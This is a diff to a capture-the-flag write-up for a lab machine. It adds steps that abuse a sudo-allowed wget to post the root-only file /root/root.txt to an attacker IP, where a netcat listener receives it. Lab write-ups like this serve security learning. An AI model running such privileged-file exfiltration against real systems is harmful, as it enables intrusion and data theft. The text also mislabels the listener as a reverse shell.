@@ -278,7 +278,7 @@ sammy@sunday:~/Desktop$ cat user.txt
 <Redacted user flag
 sammy@sunday:~/Desktop$ 
 ```
-### Privilege Escalation to root
+### Obtaining root flag
 
 First, we will check the permissions of the sammy using sudo -l and it turns out that we can execute wget commands with root privileges.
 
@@ -286,6 +286,26 @@ First, we will check the permissions of the sammy using sudo -l and it turns out
 sammy@sunday:~/Desktop$ sudo -l
 User sammy may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/wget
+```
 
+Knowing that we can execute wget with root privileges, we will use wget to send the root flag to our local machine using the ```wget --pos-file```
+```
+sammy@sunday:~$ sudo /usr/bin/wget --post-file=/root/root.txt 10.10.16.4
+--19:39:18--  http://10.10.16.4/
+           => `index.html'
+Connecting to 10.10.16.4:80... failed: Connection refused.
+sammy@sunday:~$ sudo wget --post-file=/root/root.txt 10.10.16.4:4000
+--19:40:39--  http://10.10.16.4:4000/
+           => `index.html'
+Connecting to 10.10.16.4:4000... connected.
+HTTP request sent, awaiting response... 
+```
+
+On the local machine, we will create a reverse shell that writes the contents of the root flag to the file ```root```. Viewng the ```root``` file gives us the root flag.
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -nlvp 4000 > root
+listening on [any] 4000 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.76] 60822
 ```
 ### Obtaining root flag
